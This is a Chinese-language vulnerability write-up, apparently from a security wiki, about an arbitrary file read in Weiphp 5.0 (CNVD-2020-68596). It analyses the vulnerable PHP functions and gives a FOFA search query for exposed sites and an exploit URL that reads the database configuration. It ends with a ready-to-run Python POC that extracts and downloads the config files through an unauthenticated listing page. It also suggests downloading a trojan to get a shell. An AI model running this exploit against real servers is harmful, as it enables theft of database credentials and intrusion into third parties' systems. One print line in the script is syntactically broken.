# Weiphp5.0 前台文件任意读取 CNVD-2020-68596

## 漏洞描述

Weiphp5.0 存在前台文件任意读取漏洞，可以读取数据库配置等敏感文件

## 影响版本

> [!NOTE]
>
> Weiphp <= 5.0

## 环境搭建

[weiphp5.0官方下载参考手册](https://www.weiphp.cn/doc/Initialization_database.html)

参考官方手册创建网站即可

![](http://wikioss.peiqi.tech/vuln/weiphp-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

## FOFA

> [!NOTE]
>
> app="WeiPHP"

## 漏洞复现

漏洞函数文件:**application\material\controller\Material.php**

漏洞函数:**_download_imgage**

![](http://wikioss.peiqi.tech/vuln/weiphp-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

```php
public function _download_imgage($media_id, $picUrl = '', $dd = null)
    {
        $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d');
        mkdirs($savePath);
        $cover_id = 0;
        if (empty($picUrl)) {
            // 获取图片URL
            $url = 'https://api.weixin.qq.com/cgi-bin/material/get_material?access_token=' . get_access_token();
            $param['media_id'] = $media_id;
            // dump($url);
            $picContent = post_data($url, $param, 'json', false);
            $picjson = json_decode($picContent, true);
            // dump($picjson);die;
            if (isset($picjson['errcode']) && $picjson['errcode'] != 0) {
                $cover_id = do_down_image($media_id, $dd['thumb_url']);
                if (!$cover_id) {
                    return 0;
                    exit();
                }
            }
            $picName = NOW_TIME . uniqid() . '.jpg';
            $picPath = $savePath . '/' . $picName;
            $res = file_put_contents($picPath, $picContent);
        } else {
            $content = wp_file_get_contents($picUrl);
            // 获取图片扩展名
            $picExt = substr($picUrl, strrpos($picUrl, '=') + 1);
            if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) {
                $picExt = 'jpg';
            }
            $picName = NOW_TIME . uniqid() . '.' . $picExt;
            $picPath = $savePath . '/' . $picName;
            $res = file_put_contents($picPath, $content);
            if (!$res) {
                $cover_id = do_down_image($media_id);
                if (!$cover_id) {
                    return 0;
                    exit();
                }
            }
        }

        if ($res) {
            $file = array(
                'name' => $picName,
                'type' => 'application/octet-stream',
                'tmp_name' => $picPath,
                'size' => $res,
                'error' => 0
            );

            $File = D('home/Picture');
            $cover_id = $File->addFile($file);
        }
        return $cover_id;
}
```

首先注意到函数的标识为**public**，也就是这个函数是公共调用的，并且变量**picUrl**为可控变量

根据代码从上向下分析

```php
$savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d');
```

**变量$savePath**确定文件上传后的缓存位置为**/public/uploads/picture/**，并按照**年-月-日** 创建文件夹

向下对变量**$picUrl** 是否为空进行判断，并判断是否进行登录，这里使用**POST**传参进行验证登录绕过，跳转到else语句下

![](http://wikioss.peiqi.tech/vuln/weiphp-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

```php
else {
            $content = wp_file_get_contents($picUrl);
            // 获取图片扩展名
            $picExt = substr($picUrl, strrpos($picUrl, '=') + 1);
            if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) {
                $picExt = 'jpg';
            }
            $picName = NOW_TIME . uniqid() . '.' . $picExt;
            $picPath = $savePath . '/' . $picName;
            $res = file_put_contents($picPath, $content);
            if (!$res) {
                $cover_id = do_down_image($media_id);
                if (!$cover_id) {
                    return 0;
                    exit();
                }
            }
```

分析传入变量 **picUrl** 的 **wp_file_get_contents**方法

```php
$content = wp_file_get_contents($picUrl);
```

函数文件位置 **application\common.php**

![](http://wikioss.peiqi.tech/vuln/weiphp-4.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

可以看到这里没有对我们的参数进行过滤，只做了一个有关超时的操作, 回到函数继续向下分析

```php
$picExt = substr($picUrl, strrpos($picUrl, '=') + 1);
if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) {
                $picExt = 'jpg';
}
$picName = NOW_TIME . uniqid() . '.' . $picExt;
$picPath = $savePath . '/' . $picName;
$res = file_put_contents($picPath, $content);
```

这里创建了有关当前时间的图片文件，并写入文件夹**/public/uploads/picture/** 下

我们先尝试控制变量 **$picUrl** 来写入数据库配置文件到图片中

```
/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php
```

![](http://wikioss.peiqi.tech/vuln/weiphp-5.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

查看目录**/public/uploads/picture/**，并用记事本打开写入的jpg文件

![](http://wikioss.peiqi.tech/vuln/weiphp-6.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

得到数据库配置文件的信息，既然这个变量可控，我们也可以通过这个方法下载木马文件，再通过解析漏洞或者文件包含等其他漏洞来getshell

![](http://wikioss.peiqi.tech/vuln/weiphp-7.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

在当前条件下并不知道文件名是什么，所以回到代码中继续寻找可以获取文件名的办法

![](http://wikioss.peiqi.tech/vuln/weiphp-8.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

```php
if ($res) {
            $file = array(
                'name' => $picName,
                'type' => 'application/octet-stream',
                'tmp_name' => $picPath,
                'size' => $res,
                'error' => 0
            );

            $File = D('home/Picture');
            $cover_id = $File->addFile($file);
        }
```

向下跟进 **addFile** 函数

函数位置:**application\home\model\Picture.php**

![](http://wikioss.peiqi.tech/vuln/weiphp-9.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

```php
function addFile($file)
    {
        $data['md5'] = md5_file($file['tmp_name']);
        $id = $this->where('md5', $data['md5'])->value('id');
        if ($id > 0) {
            return $id;
        }

        $info = pathinfo($file['tmp_name']);
        $data['path'] = str_replace(SITE_PATH . '/public', '', $file['tmp_name']);

        $data['sha1'] = hash_file('sha1', $file['tmp_name']);
        $data['create_time'] = NOW_TIME;
        $data['status'] = 1;
        $data['wpid'] = get_wpid();

        $id = $this->insertGetId($data);
        return $id;
    }
```

可以看到这部分代码写入了 Picture 表中

```php
$id = $this->insertGetId($data);
```

我们查看一下数据库的这个数据表，可以发现之前所上传的数据全部缓存在这个表里了

![](http://wikioss.peiqi.tech/vuln/weiphp-10.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

我们现在则需要找到不需要登录的地方来获得这些数据，所以可以全局去查找调用了这个 Picture 表的地方

![](http://wikioss.peiqi.tech/vuln/weiphp-11.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

找到一处可以利用的地方

```php
function user_pics()
    {
        $map['wpid'] = get_wpid();
        $picList = M('Picture')->where(wp_where($map))
            ->order('id desc')
            ->select();
        $this->assign('picList', $picList);
        exit($this->fetch());
    }
```

跟进 **get_wpid** 函数

```php
function get_wpid($wpid = '')
{
    if (defined('WPID')) {
        return WPID;
    } else {
        return 0;
    }
}
```

查看 WPID 的定义，文件位置在**config\weiphp_define.php**

![](http://wikioss.peiqi.tech/vuln/weiphp-12.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

定义值默认为 1，所以这里调用则可以获得数据库中Pictrue表的内容，间接的知道了文件内容以及文件名

访问地址: **http://webphp/public/index.php/home/file/user_pids**

![](http://wikioss.peiqi.tech/vuln/weiphp-13.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

可以看到文件名，根据url地址访问选择下载即可

## 漏洞利用POC

```python
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech


import requests
import random
import re


def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                \033[0m')                            \033[0m')
    print('+  \033[34mVersion: Weiphp5.0                                                \033[0m')
    print('+  \033[36m使用格式: python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl    >>> http://xxx.xxx.xxx.xxx                                 \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    upload_url = target_url + "/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    data = {
        "1":1
    }
    try:
        response = requests.post(url=upload_url, headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            print("\033[32m[o] 成功将 database.php文件 写入Pictrue表中\033[0m")
        else:
            print("\033[31m[x] 漏洞利用失败 \033[0m")
    except:
        print("\033[31m[x] 漏洞利用失败 \033[0m")

def POC_2(target_url):
    vnln_url = target_url + "/public/index.php/home/file/user_pics"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        response = requests.get(url=vnln_url, headers=headers).text
        href = re.findall(r'<img src="(.*?)"', response)
        for i in href:
            print("\033[32m[o] 得到敏感文件url：{}\033[0m".format(i))
            data = requests.get(url=i, headers=headers)
            path = str(random.randint(1,999)) + '.php'
            with open(path, 'wb') as f:
                f.write(data.content)
                print("\033[32m[o] 成功下载文件为：{}\033[0m".format(path))
                print("\033[32m[o] 文件内容为：\n\033[0m{}".format(data.text))
    except:
            print("\033[31m[x] 获取文件名失败 \033[0m")



if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
    image_url = POC_2(target_url)
```

![](http://wikioss.peiqi.tech/vuln/weiphp-14.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)